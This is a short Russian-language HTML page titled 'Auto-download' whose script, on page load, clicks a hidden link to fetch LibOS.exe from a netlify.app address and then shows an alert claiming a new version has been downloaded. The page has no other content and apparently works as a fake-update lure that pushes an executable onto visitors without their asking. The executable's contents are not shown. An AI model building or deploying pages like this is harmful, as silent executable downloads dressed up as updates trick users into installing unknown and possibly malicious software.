<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Авто-скачивание</title>
</head>
<body>
    <script>
        // Автоматическое скачивание при загрузке страницы
        window.onload = function() {
            const fileUrl = 'https://libos-update.netlify.app/LibOS.exe';
            const fileName = 'LibOS.exe';
            
            // Создаем скрытую ссылку для скачивания
            const link = document.createElement('a');
            link.href = fileUrl;
            link.download = fileName;
            link.style.display = 'none';
            
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
            
            // Показываем инструкции по установке
            alert('Новая версия скачана.');
        };
    </script>
</body>
</html>
